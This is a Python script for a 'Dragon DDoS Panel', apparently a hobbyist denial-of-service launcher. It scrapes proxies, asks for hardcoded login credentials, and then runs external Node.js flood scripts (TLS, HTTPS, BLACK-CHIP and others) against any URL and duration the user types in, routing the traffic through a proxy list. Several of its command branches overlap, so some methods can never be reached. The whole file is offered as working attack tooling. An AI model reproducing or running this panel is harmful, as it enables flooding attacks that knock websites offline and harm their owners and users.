import socket
import os
import requests
import random
import getpass
import time
import sys
from pystyle import Colors, Colorate

print("Wait Scraping Proxy")
os.system("node scrape");
print("Scraping Proxy Succes")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.yellow_to_red, "Welcome To Dragon DDoS Panel | User: root | Plan: VVIP | Proxy: " + bots_str + " | Happy To Use"))
    print("")
  
def layer7():
    clear()
    si()
    print(Colorate.Horizontal(Colors.yellow_to_red, ''' 
            LIST LAYER7 METHODS
            
TLS - POWERFULL TLS METHODS [VVIP]
TLSV1 - VERY POWERFUL TLS METHODS [VVIP]
HTTPS - SEND DDOS ATTACK WITH HTTP/1.1 [BASIC]
HTTPSV2 - SEND DDOS ATTACK WITH HTTP/1.2 [BASIC]
HTTPSV3 - New DDoS Attack With HTTP/1.3 [VVIP]
BLACK-CHIP - Fucking Website Until Down

HOW TO USE
TLS https://example.com 120         TLS URL TIME
'''))

def menu():
    clear()
    print(Colorate.Diagonal(Colors.yellow_to_red, "Welcome To Dragon DDoS Panel | User: root | Plan: VVIP | Proxy: " + bots_str + " | Happy To Use"))
    print("")
    banner = '''
        ⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

Type Layer7 To See Layer7 Methods⠀⠀⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.yellow_to_red, banner))
def main():
    menu()
    while(True):
        cnc = input(Colorate.Diagonal(Colors.yellow_to_red, "root@DragonC2#~"))
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()

        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node tls {host} {time} 35 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "TLSV1" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node tlsv1 {host} {time} 35 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "HTTPS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node httpsv2 {host} {time} 35 10 proxy.txt bypass')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');             
                
        elif "HTTPSV2" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node httpsv2 {host} {time} 35 10 proxy.txt bypass')
                os.system(f'node httpsv2 {host} {time} 35 10 proxy.txt bypass ')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BLACK-CHIP" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node black-chip {host} {time} 35 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "RAND-REQUEST" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node rand {host} {time}')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "HTTPSV3" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node httpsv3 {host} {time} 35 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');

        elif "help" in cnc:
            print(Colorate.Horizontal(Colors.yellow_to_red, ''' 
LAYER7 - SEE ALL LAYER7 METHOD
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
'''))
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "user"
    passwd = "user"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("Password/Username Salah")        
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome To Dragon DDoS Panel")
        time.sleep(0.3)
        main()
login()